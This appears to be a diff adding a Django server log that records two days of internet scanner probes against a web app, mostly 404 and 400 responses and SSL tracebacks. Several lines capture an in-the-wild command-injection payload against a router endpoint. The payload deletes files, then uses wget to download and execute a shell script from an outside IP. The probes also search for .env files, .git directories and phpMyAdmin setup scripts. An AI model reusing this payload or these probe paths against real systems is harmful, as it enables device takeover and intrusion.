+Bad Request: /deprecation.py
+[08/Feb/2024 07:44:14] "GET /deprecation.py HTTP/1.0" 400 65331
+Bad Request: /dpaste.com
+[08/Feb/2024 07:44:14] "GET /db.sqlite3 HTTP/1.0" 400 65393
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /etfo.tfo
+[08/Feb/2024 07:44:14] "GET /dpaste.com HTTP/1.0" 400 65317
+Bad Request: /exception.py
+[08/Feb/2024 07:44:14] "GET /etfo.tfo HTTP/1.0" 400 65487
+[08/Feb/2024 07:44:14] "GET /exception.py HTTP/1.0" 400 65415
+Bad Request: /python3.7
+Bad Request: /python37.zip
+[08/Feb/2024 07:44:14] "GET /python3.7 HTTP/1.0" 400 65458
+[08/Feb/2024 07:44:14] "GET /python37.zip HTTP/1.0" 400 65499
+Bad Request: /request.py
+[08/Feb/2024 07:44:14] "GET /request.py HTTP/1.0" 400 65497
+Not Found: /
+[08/Feb/2024 08:17:27] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 08:24:10] "GET / HTTP/1.0" 404 2170
+Not Found: /robots.txt
+[08/Feb/2024 09:40:28] "GET /robots.txt HTTP/1.0" 404 2215
+Not Found: /
+[08/Feb/2024 09:48:58] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[08/Feb/2024 10:15:24] "GET / HTTP/1.0" 400 65693
+Not Found: /cgi-bin/luci/;stok=/locale
+[08/Feb/2024 10:58:31] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F192.3.152.183%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.0" 404 2446
+Not Found: /cgi-bin/luci/;stok=/locale
+[08/Feb/2024 10:58:31] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F192.3.152.183%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.0" 404 2446
+Not Found: /
+[08/Feb/2024 10:59:26] "GET / HTTP/1.0" 404 2167
+Not Found: /.env
+[08/Feb/2024 11:29:15] "HEAD /.env HTTP/1.0" 404 2198
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[08/Feb/2024 12:00:13] "GET / HTTP/1.0" 400 65471
+Not Found: /
+[08/Feb/2024 12:00:24] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 13:21:36] "GET / HTTP/1.0" 404 2167
+Not Found: /cgi-bin/luci/;stok=/locale
+[08/Feb/2024 14:00:47] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F192.3.152.183%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.0" 404 2446
+Not Found: /cgi-bin/luci/;stok=/locale
+[08/Feb/2024 14:00:47] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F192.3.152.183%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.0" 404 2446
+Not Found: /
+[08/Feb/2024 14:04:22] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 14:22:29] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 14:36:22] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.8.0.2/scripts/setup.php
+[08/Feb/2024 14:38:12] "GET /phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 400 64972
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.10.2/scripts/setup.php
+[08/Feb/2024 14:38:15] "GET /phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 400 64961
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.11.9.2/scripts/setup.php
+[08/Feb/2024 14:38:18] "GET /phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 400 64983
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.11.0/scripts/setup.php
+[08/Feb/2024 14:38:18] "GET /phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 400 64961
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.5.5/scripts/setup.php
+[08/Feb/2024 14:40:53] "GET /phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0" 400 64950
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /admin/scripts/setup.php
+[08/Feb/2024 14:42:34] "GET /admin/scripts/setup.php HTTP/1.0" 400 64829
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /dbadmin/scripts/setup.php
+[08/Feb/2024 14:42:44] "GET /dbadmin/scripts/setup.php HTTP/1.0" 400 64851
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /mysql/scripts/setup.php
+[08/Feb/2024 14:42:48] "GET /mysql/scripts/setup.php HTTP/1.0" 400 64829
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin2/scripts/setup.php
+[08/Feb/2024 14:42:48] "GET /phpMyAdmin2/scripts/setup.php HTTP/1.0" 400 64895
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /php/scripts/setup.php
+[08/Feb/2024 14:44:09] "GET /php/scripts/setup.php HTTP/1.0" 400 64807
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /db/scripts/setup.php
+[08/Feb/2024 14:44:32] "GET /db/scripts/setup.php HTTP/1.0" 400 64796
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /sqlmanager/scripts/setup.php
+[08/Feb/2024 14:44:39] "GET /sqlmanager/scripts/setup.php HTTP/1.0" 400 64884
+Not Found: /
+[08/Feb/2024 15:16:50] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 15:18:55] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 15:39:19] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 15:55:10] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 16:17:02] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 17:22:49] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 18:28:06] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /FQnW
+[08/Feb/2024 18:35:39] "GET /FQnW HTTP/1.0" 400 65051
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /AxbB
+[08/Feb/2024 18:35:40] "GET /AxbB HTTP/1.0" 400 65051
+Not Found: /
+[08/Feb/2024 18:35:59] "GET / HTTP/1.0" 404 2167
+Not Found: /zabbix/favicon.ico
+[08/Feb/2024 18:44:14] "GET /zabbix/favicon.ico HTTP/1.0" 404 2239
+Not Found: /
+[08/Feb/2024 18:51:33] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 18:51:36] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 19:00:45] "GET / HTTP/1.1" 404 2167
+[08/Feb/2024 19:00:47] code 400, message Bad HTTP/0.9 request type ('t3')
+[08/Feb/2024 19:00:47] "t3 12.1.2" 400 -
+Not Found: /
+[08/Feb/2024 19:14:23] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 19:20:31] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[08/Feb/2024 19:54:55] "GET / HTTP/1.1" 404 2172
+Not Found: /favicon.ico
+[08/Feb/2024 19:54:56] "GET /favicon.ico HTTP/1.1" 404 2223
+Not Found: /robots.txt
+[08/Feb/2024 19:54:56] "GET /robots.txt HTTP/1.1" 404 2220
+Not Found: /sitemap.xml
+[08/Feb/2024 19:54:57] "GET /sitemap.xml HTTP/1.1" 404 2223
+Not Found: /
+[08/Feb/2024 19:55:54] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 20:28:31] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[08/Feb/2024 21:09:36] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /frontend/.git/HEAD
+[08/Feb/2024 22:11:15] "GET /frontend/.git/HEAD HTTP/1.0" 400 65561
+Not Found: /
+[08/Feb/2024 22:46:13] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /assets/.git/HEAD
+[08/Feb/2024 22:57:19] "GET /assets/.git/HEAD HTTP/1.0" 400 65409
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /client/.git/HEAD
+[08/Feb/2024 23:05:53] "GET /client/.git/HEAD HTTP/1.0" 400 65413
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.git/config
+[08/Feb/2024 23:31:01] "GET /.git/config HTTP/1.0" 400 66074
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /dev/.git/HEAD
+[09/Feb/2024 00:02:49] "GET /dev/.git/HEAD HTTP/1.0" 400 65362
+Not Found: /
+[09/Feb/2024 00:07:12] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /test/.git/HEAD
+[09/Feb/2024 00:21:47] "GET /test/.git/HEAD HTTP/1.0" 400 65495
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /admin/.git/HEAD
+[09/Feb/2024 00:23:37] "GET /admin/.git/HEAD HTTP/1.0" 400 65374
+Not Found: /
+[09/Feb/2024 01:19:55] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 2200
+Not Found: /
+[09/Feb/2024 01:36:34] "GET / HTTP/1.0" 404 2170
+Not Found: /actuator/gateway/routes
+[09/Feb/2024 02:25:50] "GET /actuator/gateway/routes HTTP/1.0" 404 2257
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 03:37:49] "GET / HTTP/1.0" 400 65471
+Not Found: /favicon.ico
+[09/Feb/2024 03:45:47] "GET /favicon.ico HTTP/1.1" 404 2223
+----------------------------------------
+Exception happened during processing of request from ('13.43.217.175', 38908)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /F4so
+[09/Feb/2024 03:46:03] "GET /F4so HTTP/1.0" 404 2200
+Not Found: /Cq8q
+[09/Feb/2024 03:46:04] "GET /Cq8q HTTP/1.0" 404 2200
+Not Found: /aab8
+[09/Feb/2024 03:46:05] "GET /aab8 HTTP/1.0" 404 2200
+Not Found: /jquery-3.3.1.slim.min.js
+[09/Feb/2024 03:46:05] "GET /jquery-3.3.1.slim.min.js HTTP/1.0" 404 2260
+Not Found: /aab9
+[09/Feb/2024 03:46:06] "GET /aab9 HTTP/1.0" 404 2200
+Not Found: /jquery-3.3.2.slim.min.js
+[09/Feb/2024 03:46:06] "GET /jquery-3.3.2.slim.min.js HTTP/1.0" 404 2260
+Not Found: /manage/account/login
+[09/Feb/2024 03:46:59] "GET /manage/account/login HTTP/1.1" 404 2250
+----------------------------------------
+Exception happened during processing of request from ('13.43.217.175', 54754)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[09/Feb/2024 03:48:32] "GET / HTTP/1.1" 404 2172
+Not Found: /index.html
+[09/Feb/2024 03:49:48] "GET /index.html HTTP/1.1" 404 2220
+----------------------------------------
+Exception happened during processing of request from ('13.43.217.175', 52980)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /+CSCOE+/logon.html
+[09/Feb/2024 03:51:23] "GET /+CSCOE+/logon.html HTTP/1.1" 404 2244
+----------------------------------------
+Exception happened during processing of request from ('13.43.217.175', 50972)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /logon.htm
+[09/Feb/2024 03:54:27] "GET /logon.htm HTTP/1.1" 404 2217
+----------------------------------------
+Exception happened during processing of request from ('13.43.217.175', 38302)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /login.jsp
+[09/Feb/2024 03:55:59] "GET /login.jsp HTTP/1.1" 404 2217
+----------------------------------------
+Exception happened during processing of request from ('13.43.217.175', 46258)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /doc/index.html
+[09/Feb/2024 03:57:28] "GET /doc/index.html HTTP/1.1" 404 2232
+----------------------------------------
+Exception happened during processing of request from ('13.43.217.175', 35276)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[09/Feb/2024 03:59:01] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('13.43.217.175', 54548)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /.env
+[09/Feb/2024 04:03:40] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[09/Feb/2024 04:03:40] "POST / HTTP/1.0" 404 2168
+Not Found: /
+[09/Feb/2024 04:18:57] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[09/Feb/2024 04:23:57] "GET / HTTP/1.0" 404 2167
+Not Found: /boaform/admin/formLogin
+[09/Feb/2024 05:05:11] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+Not Found: /hudson
+[09/Feb/2024 05:05:55] "GET /hudson HTTP/1.0" 404 2203
+Not Found: /
+[09/Feb/2024 05:26:32] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 05:28:06] "GET / HTTP/1.0" 400 64859
+Not Found: /portal/redlion
+[09/Feb/2024 05:49:05] "GET /portal/redlion HTTP/1.0" 404 2227
+Not Found: /
+[09/Feb/2024 05:49:28] "GET / HTTP/1.0" 404 2170
+Not Found: /HNAP1/
+[09/Feb/2024 05:49:36] "POST /HNAP1/ HTTP/1.0" 404 2207
+Not Found: /.env
+[09/Feb/2024 06:06:22] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[09/Feb/2024 06:25:05] "GET / HTTP/1.0" 404 2167
+Not Found: /webui/
+[09/Feb/2024 06:26:20] "GET /webui/ HTTP/1.0" 404 2203
+Not Found: /geoserver/web/
+[09/Feb/2024 06:28:05] "GET /geoserver/web/ HTTP/1.0" 404 2227
+Not Found: /
+[09/Feb/2024 06:54:25] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 06:54:35] "GET / HTTP/1.0" 400 66354
+Not Found: /.env
+[09/Feb/2024 07:06:44] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[09/Feb/2024 07:06:44] "POST / HTTP/1.0" 404 2168
+Not Found: /
+[09/Feb/2024 08:00:33] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 08:35:52] "GET / HTTP/1.0" 400 66089
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 08:46:00] "GET / HTTP/1.0" 400 65143
+Not Found: /
+[09/Feb/2024 08:46:42] "GET / HTTP/1.0" 404 2170
+Not Found: /aaa9
+[09/Feb/2024 08:46:42] "GET /aaa9 HTTP/1.0" 404 2200
+Not Found: /aab9
+[09/Feb/2024 08:46:43] "GET /aab9 HTTP/1.0" 404 2200
+Not Found: /aaa9
+[09/Feb/2024 08:47:03] "GET /aaa9 HTTP/1.0" 404 2200
+Not Found: /aab9
+[09/Feb/2024 08:47:03] "GET /aab9 HTTP/1.0" 404 2200
+Not Found: /
+[09/Feb/2024 09:08:52] "GET / HTTP/1.0" 404 2170
+Not Found: /.env
+[09/Feb/2024 09:18:34] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[09/Feb/2024 09:18:35] "POST / HTTP/1.0" 404 2168
+Not Found: /
+[09/Feb/2024 11:14:26] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[09/Feb/2024 11:24:42] "GET / HTTP/1.0" 404 2167
+Not Found: /cf_scripts/scripts/ajax/ckeditor/ckeditor.js
+[09/Feb/2024 11:24:43] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.0" 404 2317
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /web/.git/HEAD
+[09/Feb/2024 11:48:15] "GET /web/.git/HEAD HTTP/1.0" 400 65506
+Not Found: /
+[09/Feb/2024 12:12:11] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[09/Feb/2024 12:15:19] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[09/Feb/2024 12:15:19] "GET / HTTP/1.0" 404 2170
+Not Found: /robots.txt
+[09/Feb/2024 12:15:20] "GET /robots.txt HTTP/1.0" 404 2218
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /templates/.git/HEAD
+[09/Feb/2024 13:05:31] "GET /templates/.git/HEAD HTTP/1.0" 400 65586
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /.git/HEAD
+[09/Feb/2024 13:17:24] "GET /.git/HEAD HTTP/1.0" 400 65462
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /api/.git/HEAD
+[09/Feb/2024 13:49:19] "GET /api/.git/HEAD HTTP/1.0" 400 65484
+Not Found: /
+[09/Feb/2024 14:20:41] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[09/Feb/2024 14:22:37] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('64.62.197.67', 28981)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
